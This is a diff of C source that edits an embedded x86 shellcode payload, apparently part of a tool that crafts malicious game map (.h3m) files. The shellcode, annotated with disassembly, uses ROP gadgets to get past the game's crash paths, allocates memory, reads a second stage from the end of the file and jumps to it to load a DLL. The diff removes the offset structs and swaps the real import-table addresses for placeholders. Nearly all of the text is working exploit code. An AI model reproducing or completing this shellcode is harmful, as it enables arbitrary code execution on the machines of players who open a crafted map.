@@ -131,28 +131,6 @@ static const struct iat_t * const TARGET_IATS[] = {
     // TODO retrieve
 };
 
-struct shellcode_oa_jmp_to_dll_load_t {
-    uint8_t c0_0[8];
-    uint16_t maps_stack_offset;
-    uint8_t c0_1[16];
-    uint32_t SetCurrentDirectoryA;
-    uint8_t c1_0[23];
-    uint32_t CreateFileA;
-    uint8_t c1_1[10];
-    uint32_t total_file_size;
-    uint8_t c1_2[5];
-    uint32_t VirtualAlloc;
-    uint8_t c1_3[2];
-    uint32_t shellcode_eof_offset;
-    uint8_t c1_4[23];
-    uint32_t ReadFile;
-    uint8_t c2[8]; // includes c3, j2 up to ss
-    uint32_t call_esp_gadget;
-    uint32_t anticrash_gadget1;
-    uint32_t anticrash_gadget2;
-    uint8_t j1[2];
-};
-
 // This shellcode is put inside the OA section and jmps to DLL LOAD at EOF
 static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0xCC,                                       // UNUSED
@@ -165,7 +143,7 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0x83, 0xC7, 0x20,                           // ADD EDI,20       ; for HD+
         0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI + ESP]
 /*c1:*/ 0x50,                                       // PUSH EAX
-        0xFF, 0x15, 0x04, 0xA2, 0x63, 0x00,         // CALL DWORD PTR DS:[<&KeRNeL32.SetCurrentDirectoryA>]
+        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS:[<&KeRNeL32.SetCurrentDirectoryA>]
         0x31, 0xDB,                                 // XOR EBX,EBX
         0x53,                                       // PUSH EBX
         0x53,                                       // PUSH EBX
@@ -176,14 +154,14 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0x83, 0xC7, 0x1C,                           // ADD EDI,1C       ; point EDI to h3m filename
         0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI + ESP]
         0x50,                                       // PUSH EAX
-        0xFF, 0x15, 0x08, 0xA1, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
+        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
         0x89, 0xC3,                                 // MOV EBX, EAX
         0x6A, 0x40,                                 // PUSH 40
         0x68, 0x00, 0x10, 0x00, 0x00,               // PUSH 1000
         0xBF, 0x12, 0x34, 0x56, 0x78,               // MOV EDI, 0x12345678 ; total_file_size
         0x57,                                       // PUSH EDI
         0x6A, 0x00,                                 // PUSH 0
-        0xFF, 0x15, 0x48, 0xA1, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.VirtualAlloc>]
+        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.VirtualAlloc>]
         0x8D, 0xA8, 0x12, 0x34, 0x56, 0x78,         // LEA EBP, [EAX + 0x12345678] ; shellcode_eof_offset
         0x6A, 0x00,                                 // PUSH 0
         0x54,                                       // PUSH ESP
@@ -195,7 +173,7 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0xEB, 0x07,                                 // JS c3 <+0x07> ; jumps to c3
         0xCC,                                       // UNUSED
         0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // ; GARBAGE, game trashes these bytes
-        0xFF, 0x15, 0xF4, 0xA0, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.ReadFile>]
+        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.ReadFile>]
         0xFF, 0xE5,                                 // JMP EBP
         0xCC, 0xCC,                                 // ; GARBAGE, game trashes these bytes
         0xCC,                                       // UNUSED
@@ -205,39 +183,6 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget1
         0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget2
 /*j1:*/ 0xEB, 0xEF                                  // JS j2 <-0x0F> ; j1, jumps to j2
-};
-
-struct shellcode_eof_load_dll_t {
-    uint8_t c1_1[3];
-    uint32_t CloseHandle1;
-    uint8_t c1_3[24];
-    uint32_t CreateFileA;
-    uint8_t c1_4[6];
-    uint32_t dll_size;
-    uint8_t c1_5[2];
-    uint32_t dll_offset;
-    uint8_t c1_6[4];
-    uint32_t WriteFile;
-    uint8_t c1_7[3];
-    uint32_t CloseHandle2;
-    uint8_t c1_8[3];
-    uint32_t LoadLibraryA;
-    uint8_t c2_1[6];
-    uint32_t GetModuleHandleA1;
-    uint8_t c2_2[7];
-    uint32_t GetProcAddress1;
-    uint8_t c2_3[8];
-    uint32_t GetModuleHandleA2;
-    uint8_t c2_4[7];
-    uint32_t GetProcAddress2;
-    uint8_t c2_5[22];
-    uint32_t SetCurrentDirectoryA;
-    uint8_t c2_6[24];
-    uint32_t orig_retn;
-    uint8_t c2_7[4];
-    uint32_t map_format;
-    uint8_t c2_8[67]; // contains s: (strings) as well
-    uint8_t dll[];
 };
 
 // This shellcode is at the EOF
@@ -406,7 +351,7 @@ static const unsigned int TARGET_FIX_SIZES[] = {
 // while it also makes the game itself satisfied by being a valid start of
 // OD section
 static const uint8_t MAPED_VALIDATION[] = {
-    0x12, 0x34, 0x56, 0x78, 0xFF, 0xFF, 0x00, 0x12, 0x34, 0x56, 0x78, 0x00, 0x00, 0x00, 
+    0x12, 0x34, 0x56, 0x78, 0xFF, 0xFF, 0x00, 0x12, 0x34, 0x56, 0x78, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x68, 0x33, 0x6D, 0x6C, 0x69, 0x62, 0x20, 0x62,
     0x79, 0x20, 0x70, 0x6F, 0x74, 0x6D, 0x64, 0x65, 0x68, 0x65, 0x78, 0x00, 0x00, 0x00
 };
